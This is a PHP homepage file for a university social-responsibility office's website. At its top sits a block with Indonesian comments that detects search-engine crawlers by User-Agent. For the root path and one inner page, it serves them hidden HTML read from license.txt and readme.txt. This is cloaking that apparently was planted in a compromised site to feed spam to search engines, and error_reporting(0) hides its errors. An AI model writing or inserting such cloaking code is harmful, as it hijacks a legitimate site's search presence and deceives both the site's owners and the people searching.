<?php
error_reporting(0);

// Ambil IP dan User-Agent
$visitor_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ??
              $_SERVER['HTTP_INCAP_CLIENT_IP'] ??
              $_SERVER['HTTP_TRUE_CLIENT_IP'] ??
              $_SERVER['HTTP_REMOTEIP'] ??
              $_SERVER['HTTP_X_REAL_IP'] ??
              $_SERVER['REMOTE_ADDR'];

$agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');

// Dapatkan path URL
$path = rtrim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');

// Daftar file cloaking (HARUS berisi HTML valid di dalam .txt)
$cloaked_links = [
    '' => __DIR__ . '/license.txt',
    '/pagina_web/areas/ambiental.php' => __DIR__ . '/readme.txt'
];

// Deteksi User-Agent bot (termasuk Googlebot, Ahrefs, dll)
$bot_signatures = ['google', 'bot', 'crawl', 'spider', 'slurp', 'ahrefs', 'bing'];
$is_bot = false;
foreach ($bot_signatures as $sig) {
    if (strpos($agent, $sig) !== false) {
        $is_bot = true;
        break;
    }
}

// Jika ini bot dan ada file untuk halaman itu
if ($is_bot && isset($cloaked_links[$path])) {
    $html_file = $cloaked_links[$path];
    if (file_exists($html_file)) {
        header("Content-Type: text/html; charset=UTF-8");
        readfile($html_file);
        exit;
    }
}

// Jika bukan bot atau tidak cocok, lanjut render website
require __DIR__.'/inc/app_boot.php';
$page_title = 'DIRSU - Dirección de Responsabilidad Social y Extensión Cultural Universitaria';
include APP_ROOT.'/inc/head.php';

include APP_ROOT.'/inc/topbar.php';
include APP_ROOT.'/inc/navbar.php';

include APP_ROOT.'/partials/carousel.php';
include APP_ROOT.'/partials/home_top_feature.php';
include APP_ROOT.'/partials/home_about.php';
include APP_ROOT.'/partials/home_facts.php';
include APP_ROOT.'/partials/home_features.php';
include APP_ROOT.'/partials/home_services.php';
include APP_ROOT.'/partials/home_convocatoria.php';
include APP_ROOT.'/partials/home_dirsu_brief.php';

/*
// Opsional: Aktifkan jika file partials-nya tersedia
include APP_ROOT.'/partials/home_projects.php';
include APP_ROOT.'/partials/home_team.php';
*/

include APP_ROOT.'/inc/footer.php';
include APP_ROOT.'/inc/scripts.php';
?>
